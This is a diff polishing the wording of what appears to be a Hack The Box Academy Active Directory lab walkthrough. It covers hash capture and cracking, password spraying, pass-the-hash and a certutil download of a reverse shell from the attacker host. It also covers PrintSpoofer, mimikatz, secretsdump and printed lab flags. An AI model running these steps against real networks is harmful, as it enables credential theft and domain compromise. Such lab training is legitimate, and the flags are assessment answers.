@@ -37,7 +37,7 @@ Nmap done: 1 IP address (1 host up) scanned in 41.42 seconds
 
 ### Initial Access
 
-Using given credentials access the machine via SSH. `htb-student:HTB_@cademy_stdnt!`
+Using the given credentials, access the machine via SSH: `htb-student:HTB_@cademy_stdnt!`
 
 ```shell
 $ ssh htb-student@10.129.71.123                 
@@ -62,10 +62,10 @@ Last login: Sat Apr  9 18:29:27 2022 from 10.10.14.15
 htb-student
 ```
 
-Discover the target subnet
+Discover the target subnet:
 
 ```shell
-$ifconfig
+$ ifconfig
 ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet 172.16.7.240  netmask 255.255.254.0  broadcast 172.16.7.255
         inet6 fe80::2957:2d31:5225:229a  prefixlen 64  scopeid 0x20<link>
@@ -76,25 +76,25 @@ ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 ```
 
-Find the other hosts doing a ping sweep.
+Find the other hosts by doing a ping sweep:
 
 ```shell
-$fping -a -g 172.16.7.1 172.16.7.254 2>/dev/null                                                                      
+$ fping -a -g 172.16.7.1 172.16.7.254 2>/dev/null                                                                      
 172.16.7.3
 172.16.7.50
 172.16.7.60
 172.16.7.240
 ```
 
-With responder get the first hash
+With Responder, get the first hash:
 
 ```bash
-$sudo responder -I ens224
+$ sudo responder -I ens224
 ...
 AB920::INLANEFREIGHT:e205f26f8291495f:5E69720E137108895E99F69A81ED339A:0101000000000000804D535D932FDB01955CDEEF49CBE4C300000000020008004A004C005900570001001E00570049004E002D00340057004B00340053004A004F00350058004700330004003400570049004E002D00340057004B00340053004A004F0035005800470033002E004A004C00590057002E004C004F00430041004C00030014004A004C00590057002E004C004F00430041004C00050014004A004C00590057002E004C004F00430041004C0007000800804D535D932FDB0106000400020000000800300030000000000000000000000000200000115801637F59268F84E68FA667CFFF2EF418BFAAA39DCAFF8F00333308C05CE90A0010000000000000000000000000000000000009002E0063006900660073002F0049004E004C0041004E0045004600520049004700480054002E004C004F00430041004C00000000000000000000000000
 ```
 
-Crack it with hashcat
+Crack it with Hashcat:
 
 ```bash
 $ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt --force    
@@ -111,7 +111,7 @@ AB920::INLANEFREIGHT:e205f26f8291495f:5e69720e137108895e99f69a81ed339a:010100000
 
 `ab920:weasal`
 
-The user can access .50
+The user can access `.50`:
 
 ```shell
 ┌─[htb-student@skills-par01]─[~]
@@ -121,7 +121,7 @@ WINRM       172.16.7.50     5985   NONE             [*] http://172.16.7.50:5985/
 WINRM       172.16.7.50     5985   NONE             [+] None\ab920:weasal (Pwn3d!)
 ```
 
-Collect the domain data with bloodhound-python, transfer it to the attack machine via scp and upload it to bloodhound
+Collect the domain data with `bloodhound-python`, transfer it to the attack machine via `scp`, and upload it to BloodHound:
 
 ```shell
 $bloodhound-python -c All -u ab920 -p weasal -d inlanefreight.local -dc dc01.inlanefreight.local -ns 172.16.7.3 --zip
@@ -187,10 +187,10 @@ Nmap done: 1 IP address (1 host up) scanned in 249.32 seconds
 
 ### Initial Access
 
-Evil-winrm with ab920 credentials
+Use Evil-WinRM with `ab920` credentials:
 
 ```shell
-$evil-winrm -i 172.16.7.50 -u ab920 -p weasal
+$ evil-winrm -i 172.16.7.50 -u ab920 -p weasal
 
 Evil-WinRM shell v3.3
 Info: Establishing connection to remote endpoint
@@ -208,14 +208,14 @@ Get the flag
 aud1t_gr0up_m3mbersh1ps!
 ```
 
-Make a user list with nxc and test weak passwords
+Make a user list with `nxc` and test weak passwords:
 
 ```shell
 $crackmapexec smb 172.16.7.3 -u ab920 -p weasal --users > users
 $cat users | grep '.LOCAL\\' | awk  '{print $5}' | awk -F'\' '{print $2}' | sponge users
 ```
 
-Try `Welcome1` as seen in the lessons.
+Try `Welcome1` as seen in the lessons:
 
 ```shell
 $kerbrute passwordspray --dc 172.16.7.3 -d inlanefreight.local users Welcome1
@@ -237,7 +237,7 @@ Version: dev (9cfb81e) - 05/03/25 - Ronnie Flathers @ropnop
 
 `br086:Welcome1`
 
-Searching DC shares there is a database config inside 172.16.7.3/Department Shares/IT/Private/development/web.config
+Searching DC shares, there is a database config inside `172.16.7.3/Department Shares/IT/Private/development/web.config`:
 
 ```shell
 $smbclient -U 'inlanefreight.local/br086%Welcome1'  //172.16.7.3/'Department Shares'                       
@@ -285,9 +285,9 @@ $cat web.config
 </configuration>
 ```
 
-Credentials for the sql instance in .60
+Credentials for the SQL instance in `.60`.
 
-Connect with administrator hash found in .60
+Connect with the administrator hash found in `.60`:
 
 ```shell
 $evil-winrm -i 172.16.7.50 -u administrator -H bdaffbfe64f1fc646a3353be1c2c3c99
@@ -304,7 +304,7 @@ exc3ss1ve_adm1n_r1ights!
 
 ### Post Exploitation
 
-Start Inveigh to capture another user's hash
+Start Inveigh to capture another user's hash:
 
 ```shell
 *Evil-WinRM* PS C:\> .\Inveigh.exe
@@ -316,7 +316,7 @@ Start Inveigh to capture another user's hash
 CT059::INLANEFREIGHT:657FC8E7FD298751:9A7E500D73CC87A0DBA889BDEE4C83C6:01010000000000002711A86751BCDB014925B826A4EB22560000000002001A0049004E004C0041004E0045004600520045004900470048005400010008004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00030030004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008002711A86751BCDB01060004000200000008003000300000000000000000000000002000001FA3085A887D0FA2252C1FB845AC575E5F32B98BF5A6E6B0049C7F42FA302F970A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0037002E0035003000000000000000000000000000
 ```
 
-Using hashcat
+Using Hashcat:
 
 ```hash
 $ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt --force  
@@ -327,11 +327,11 @@ CT059::INLANEFREIGHT:657fc8e7fd298751:9a7e500d73cc87a0dba889bdee4c83c6:010100000
 
 `ct059:charlie1`
 
-Looking at bloodhound, this user has GenericAll to the group Domain Admins
+Looking at BloodHound, this user has `GenericAll` to the group `Domain Admins`:
 
 ![](assets/Pasted%20image%2020250503205145.png)
 
-Add it to the group.
+Add it to the group:
 
 ```shell
 $net rpc group addmem "domain admins" "ct059" -U "inlanefreight"/"ct059"%"charlie1" -S "dc01.inlanefreight.local"                                                                                    
@@ -411,7 +411,7 @@ Nmap done: 1 IP address (1 host up) scanned in 255.51 seconds
 
 ### Initial Access
 
-Use impacket-mssqlclient to access the instance
+Use impacket-mssqlclient to access the instance:
 
 ```shell
 $impacket-mssqlclient inlanefreight.local/netdb:'D@ta_bAse_adm1n!'@172.16.7.60                 
@@ -438,7 +438,7 @@ nt service\mssql$sqlexpress
 NULL  
 ```
 
-Generate a msfvenom reverse shell, get it and connect back to a more stable shell
+Generate a msfvenom reverse shell, get it and connect back to a more stable shell:
 
 ```shell
 SQL> xp_cmdshell certutil -f -urlcache -split http://172.16.7.240:4444/reverse.exe C:\users\public\documents\reverse.exe
@@ -459,7 +459,7 @@ nt service\mssql$sqlexpress
 
 ### Privilege Escalation
 
-User has seimpersonateprivs so using printspoofer
+User has seimpersonateprivs so using printspoofer:
 
 ```shell
 C:\Users\Public>certutil -f -split -urlcache http://172.16.7.240:6666/PrintSpoofer64.exe
@@ -478,7 +478,7 @@ nt authority\system
 
 ### Post Exploitation
 
-Upload mimikatz and get local hashes
+Upload mimikatz and get local hashes:
 
 ```shell
 PS C:\users\administrator\desktop> .\mimikatz.exe "lsadump::sam" "exit"                                                     
@@ -503,20 +503,20 @@ User : Administrator
   Hash NTLM: bdaffbfe64f1fc646a3353be1c2c3c99
 ```
 
-Reenter with evil-winrm for an easier postex
+Reenter with evil-winrm for an easier postex:
 
 ```shell
 $evil-winrm -i 172.16.7.60 -u administrator -H bdaffbfe64f1fc646a3353be1c2c3c99
 ```
 
-Get the flag
+Get the flag:
 
 ```shell
 *Evil-WinRM* PS C:\users\administrator\desktop> type flag.txt
 s3imp3rs0nate_cl@ssic
 ```
 
-Testing the hash is also valid for .50
+Testing the hash is also valid for `.50`:
 
 ```shell
 $crackmapexec smb 172.16.7.50 -u administrator -H bdaffbfe64f1fc646a3353be1c2c3c99 --local-auth
@@ -580,7 +580,7 @@ Nmap done: 1 IP address (1 host up) scanned in 251.40 seconds
 
 ### Initial Access
 
-Using ct059 after add it to domain admins
+Using ct059 after adding it to domain admins:
 
 ```shell
 $evil-winrm -i 172.16.7.3 -u ct059 -p charlie1
@@ -594,14 +594,14 @@ inlanefreight\ct059
 
 ### Post Exploitation
 
-Get the  flag
+Get the flag:
 
 ```shell
 *Evil-WinRM* PS C:\Users\administrator\desktop> type flag.txt
 acLs_f0r_th3_w1n!
 ```
 
-Get domain users hashes
+Get domain users' hashes:
 
 ```shell
 $impacket-secretsdump inlanefreight/ct059:charlie1@172.16.7.3
